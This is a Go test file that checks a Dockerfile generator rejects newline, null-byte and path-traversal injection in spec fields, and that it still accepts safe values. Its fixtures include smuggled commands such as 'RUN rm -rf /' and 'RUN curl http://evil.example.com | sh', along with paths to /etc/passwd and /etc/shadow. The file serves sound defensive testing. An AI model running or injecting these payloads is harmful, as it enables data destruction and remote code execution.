package build

import (
	"strings"
	"testing"

	"strait/internal/domain"
)

// TestGenerateDockerfile_NewlineInjection verifies that newlines in any
// DockerfileSpec field are rejected before reaching the template engine.
// A newline in a FROM, COPY, or LABEL argument would split the instruction
// and allow injection of arbitrary Dockerfile directives.
func TestGenerateDockerfile_NewlineInjection(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name string
		spec DockerfileSpec
	}{
		{
			name: "newline in base image",
			spec: DockerfileSpec{
				Runtime:   domain.RuntimePython,
				BaseImage: "ubuntu:latest\nRUN rm -rf /",
				JobSlug:   "safe-job",
			},
		},
		{
			name: "CR in base image",
			spec: DockerfileSpec{
				Runtime:   domain.RuntimePython,
				BaseImage: "ubuntu:latest\rRUN evil",
				JobSlug:   "safe-job",
			},
		},
		{
			name: "newline in job slug",
			spec: DockerfileSpec{
				Runtime: domain.RuntimePython,
				JobSlug: "my-job\nRUN curl http://evil.example.com | sh",
			},
		},
		{
			name: "CR in job slug",
			spec: DockerfileSpec{
				Runtime: domain.RuntimePython,
				JobSlug: "my-job\rEVIL",
			},
		},
		{
			name: "newline in deps file",
			spec: DockerfileSpec{
				Runtime:  domain.RuntimePython,
				JobSlug:  "safe-job",
				DepsFile: "requirements.txt\nRUN malicious",
			},
		},
		{
			name: "CR in deps file",
			spec: DockerfileSpec{
				Runtime:  domain.RuntimePython,
				JobSlug:  "safe-job",
				DepsFile: "requirements.txt\rEVIL",
			},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			_, err := GenerateDockerfile(tc.spec)
			if err == nil {
				t.Fatalf("%s: expected error for control character injection, got nil", tc.name)
			}
		})
	}
}

// TestGenerateDockerfile_NullByteInjection verifies that null bytes in
// DockerfileSpec fields are rejected; null bytes can truncate strings in
// C-backed parsers and bypass validation.
func TestGenerateDockerfile_NullByteInjection(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name string
		spec DockerfileSpec
	}{
		{
			name: "null byte in base image",
			spec: DockerfileSpec{
				Runtime:   domain.RuntimePython,
				BaseImage: "ubuntu:latest\x00evil",
				JobSlug:   "safe-job",
			},
		},
		{
			name: "null byte in job slug",
			spec: DockerfileSpec{
				Runtime: domain.RuntimePython,
				JobSlug: "my-job\x00evil",
			},
		},
		{
			name: "null byte in deps file",
			spec: DockerfileSpec{
				Runtime:  domain.RuntimePython,
				JobSlug:  "safe-job",
				DepsFile: "requirements.txt\x00.evil",
			},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			_, err := GenerateDockerfile(tc.spec)
			if err == nil {
				t.Fatalf("%s: expected error for null byte, got nil", tc.name)
			}
		})
	}
}

// TestGenerateDockerfile_DepsFileTraversal verifies that path traversal in
// DepsFile is rejected so the COPY instruction cannot reference files
// outside the build context (e.g. /etc/passwd or ../secret).
func TestGenerateDockerfile_DepsFileTraversal(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name     string
		depsFile string
	}{
		{"parent directory", "../requirements.txt"},
		{"deep traversal", "../../etc/passwd"},
		{"absolute path", "/etc/requirements.txt"},
		{"traversal in middle", "subdir/../../etc/shadow"},
		{"dot-dot only", ".."},
		{"double slash", "//etc/requirements.txt"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			spec := DockerfileSpec{
				Runtime:  domain.RuntimePython,
				JobSlug:  "safe-job",
				DepsFile: tc.depsFile,
			}
			_, err := GenerateDockerfile(spec)
			if err == nil {
				t.Fatalf("DepsFile %q: expected error for path traversal, got nil", tc.depsFile)
			}
		})
	}
}

// TestGenerateDockerfile_SafeFields verifies that legitimate non-default field
// values are accepted: the validation must not be overly strict.
func TestGenerateDockerfile_SafeFields(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name string
		spec DockerfileSpec
	}{
		{
			name: "custom registry base image",
			spec: DockerfileSpec{
				Runtime:   domain.RuntimePython,
				BaseImage: "registry.internal.example.com:5000/my-org/python:3.12-slim",
				JobSlug:   "prod-job",
			},
		},
		{
			name: "job slug with hyphens and numbers",
			spec: DockerfileSpec{
				Runtime: domain.RuntimeGo,
				JobSlug: "my-job-42",
			},
		},
		{
			name: "deps file in subdirectory",
			spec: DockerfileSpec{
				Runtime:  domain.RuntimePython,
				JobSlug:  "safe-job",
				DepsFile: "deploy/requirements.txt",
			},
		},
		{
			name: "deps file with dot prefix",
			spec: DockerfileSpec{
				Runtime:  domain.RuntimeTypeScript,
				JobSlug:  "ts-job",
				DepsFile: "package.json",
			},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			out, err := GenerateDockerfile(tc.spec)
			if err != nil {
				t.Fatalf("%s: unexpected error: %v", tc.name, err)
			}
			if out == "" {
				t.Fatalf("%s: expected non-empty Dockerfile output", tc.name)
			}
		})
	}
}

// TestGenerateDockerfile_InjectionDoesNotReachOutput confirms that even if
// validation were somehow bypassed, the injected text would appear verbatim
// (not silently dropped) — serving as a canary for the template's behaviour.
// This test documents that text/template does NOT re-evaluate data values as
// template syntax, so "{{.Runtime}}" in a field is safe.
func TestGenerateDockerfile_TemplateSyntaxInJobSlug(t *testing.T) {
	t.Parallel()

	// Go's text/template inserts the field value literally; template metacharacters
	// in the data are NOT interpreted as template directives.
	spec := DockerfileSpec{
		Runtime: domain.RuntimePython,
		// "{{.Runtime}}" looks like a template action but is just data.
		JobSlug: `{{.Runtime}}`,
	}
	out, err := GenerateDockerfile(spec)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// The literal text must appear unchanged in the output label.
	if !strings.Contains(out, `{{.Runtime}}`) {
		t.Errorf("expected literal template syntax in output, got:\n%s", out)
	}
	// Count how many times the LABEL line contains the job slug verbatim.
	// It must appear exactly once (in the LABEL instruction), not be evaluated
	// again as a template action that would substitute the runtime name.
	labelCount := strings.Count(out, `strait.job="{{.Runtime}}"`)
	if labelCount != 1 {
		t.Errorf("expected label to contain literal {{.Runtime}} exactly once, got %d occurrences:\n%s", labelCount, out)
	}
}
